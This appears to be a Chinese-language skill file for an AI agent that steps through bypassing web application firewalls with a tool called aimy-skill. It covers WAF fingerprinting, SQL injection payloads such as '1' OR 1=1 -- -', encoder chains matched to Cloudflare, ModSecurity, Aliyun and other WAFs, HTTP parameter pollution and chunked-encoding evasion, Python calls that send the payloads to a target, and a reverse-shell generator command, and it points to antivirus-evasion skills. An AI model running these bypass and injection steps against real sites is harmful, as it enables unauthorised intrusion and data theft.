---
name: aimy-armor-break
description: >-
  Drive aimy-skill's defense-bypass (破甲) capability. Use when a payload is
  blocked by a WAF or filter, when an injection is suspected but the request is
  rejected, or when the operator needs fingerprint -> bypass -> encode -> verify
  against a hardened target with the project's own CLI commands and Python API.
---

# SKILL: aimy-skill 破甲（防御绕过）全流程

> **定位**：破甲 = 先指纹识别 WAF，再按 WAF 选编码链与 HTTP 协议绕过，最后负对照验证。
> 不是无脑塞 payload，而是"识别甲 → 选对武器 → 穿透 → 证明穿透"。

## 0. 命令速查（CLI）

| 目的 | 命令 |
|---|---|
| 破甲一键 | `python main.py poja URL --param id --payload "…" [--waf cloudflare] [--session-file sess.json]` |
| WAF 指纹 | `python main.py waf URL` |
| 严格绕过（指纹+重放） | `python main.py waf-heavy URL --param PARAM --session-file sess.json` |
| payload 变异 | `python main.py payload-mutate --payload "…" --param "id"` |
| 模糊测试 | `python main.py fuzz-engine --url URL --param PARAM --vuln-type sql --count 200` |
| 反弹 shell 编码 | `python main.py reverse-shell --lhost LHOST --lport LPORT --encode b64` |

## 1. 破甲五步

### ① 指纹识别（先看甲是什么）
```
python main.py waf https://target.com
```
30+ 种 WAF 指纹（以源码 `WAF_SIGNATURES` 为准，README 标的 14 已过期），高频：
`cloudflare` / `akamai` / `aws_waf` / `mod_security` / `imperva` / `f5_bigip` / `sucuri` /
`barracuda` / `fortinet` / `wordfence` / `citrix_netscaler` / `aliyun_waf`(阿里云盾) /
`baidu_yunjiasu`(百度云加速) / `tencent_waf`(腾讯) / `360_wangzhan` / `chaitin_waf`(长亭 SafeLine) /
`hws_waf`(华为) / `naxsi` / `webknight` 等。

判别依据：响应头（`cf-ray` / `x-sucuri-id` / `x-amzn-*` / `x-ts-*`）、
拦截页文本（`拦截提示` / `request blocked` / `参考号 reference #`）。

### ② 判定拦截（确认是 WAF 而非业务报错）
用 `tools/waf_bypass.py` 的 `is_blocked(resp, threshold)` 和 `classify_block(resp)` 区分：
- WAF 拦截：状态码 403/406/412、`set-cookie` 里出现 `__cfduid`、body 命中拦截关键词
- 业务报错：返回 200 但内容为空、框架统一错误页（无表名/版本）

### ③ 选编码链（按 WAF 与漏洞类型）
`tools/waf_bypass.py` 的 `BypassEncoder` 提供 20 个编码器，常用链：

```
url_encode        double_url_encode   unicode_url_encode  overlong_utf8_encode
ibm037_encode     hex_encode          null_bytes          case_random
scientific_notation  negative_sign    tab_injection       newline_injection
crlf_injection    comment_before_keyword  mixed_case_heavy  logical_swaps
eq_to_like        scientific_alternative  versioned_comment  redundant_url_encode
```

按 WAF 分派（`generate_sqli_payloads(raw, waf_name)` 已内置策略）：
- Cloudflare / 安全狗 → `versioned_comment` + `comment_before_keyword`（`/*!50000*/`、`/**/`）
- ModSecurity 类 → `double_url_encode` + `case_random`（规则按小写关键字匹配）
- 阿里云盾 / 腾讯 → `scientific_notation` + `eq_to_like`（`1e0` 绕过数字过滤、`LIKE` 替代 `=`)
- 长亭 SafeLine → `logical_swaps` + `negative_sign`（语义等价改写）

单条应用：`apply_encoder_chain(raw_payload, [BypassEncoder.double_url_encode, BypassEncoder.comment_before_keyword])`
（链参数是**可调用对象**不是字符串名；实测 `double_url_encode("1' OR 1=1")` → `1%2527%2520OR%25201%253D1`）

### ④ HTTP 协议层绕过（编码不够时）
`HTTPBypass` 6 种方法：
- `hpp` / `hpp_duplicate` —— 参数污染（WAF 看第一个值、后端取最后一个）
- `content_type_json` / `content_type_xml` —— 换 Content-Type 绕过表单规则
- `chunked_encoding` —— 分块传输，拆散关键字
- `method_override` —— `X-HTTP-Method-Override` 改谓词绕过规则集

### ⑤ 验证穿透（负对照 + 证据）
一条命令跑到底（指纹→生成→穿透→证据）：
```
python main.py poja URL --param id --payload "1' OR 1=1 -- -" [--waf cloudflare] [--session-file sess.json]
```
输出 `vulnerable` / `best_payload` / `bypasses`（穿透成功的变体 + 状态码 + 响应长度）。

库函数直调（更细粒度）：

```python
from tools.waf_bypass import adaptive_bypass, test_sqli_bypass, generate_sqli_payloads, generate_bypasses
import requests
s = requests.Session()
# 自适应：基线 -> 编码链 -> 重放，返回哪个变体穿透（sess 为必填位置参数）
adaptive_bypass(url, "id", "1' AND 1=1 -- -", s, timeout=10)
# 定向 SQLi 穿透测试（waf_name、timeout 为必填）
test_sqli_bypass(url, "id", s, "cloudflare", 10)
# WAF 感知的 SQLi payload 生成
generate_sqli_payloads("1' OR 1=1", "cloudflare")
# 通用绕过 payload（键是 sqli 不是 sql）
generate_bypasses("sqli")
```

验证成立标准（与误报区分）：
- 布尔：`1=1` 与 `1=2` 响应长度/内容出现**稳定差异**（至少两对复验）
- 时间：`SLEEP` payload 有延迟、孪生零延迟 payload 无延迟（负对照）
- 回显：`version()` / `database()` 落进响应体

## 2. 破甲失败时的升级路径

1. `waf` 无指纹 → 可能是自研规则或 CDN 前置，转通用编码链 + HPP
2. 编码全被封 → `waf-heavy` 跑严格绕过（自带指纹+重放+多链）
3. 仍未穿透 → 用 `payload-mutate --payload "…"` 枚举变异，再 `fuzz-engine --vuln-type sql`
4. 目标有 AV/EDR（非 web）→ 加载 `windows-av-evasion`、`anti-debugging-techniques` 技能，本技能不覆盖

## 3. 与其他技能协同
- 命中具体漏洞类型后：SQLi → `sqli-sql-injection`；XSS → `xss-cross-site-scripting`；SSRF → `ssrf-server-side-request-forgery`
- 通用 WAF 方法论 → `waf-bypass-techniques`
- 本项目命令全量 → `docs/tool_guide.md`，打法 → `docs/vuln_playbooks.md`
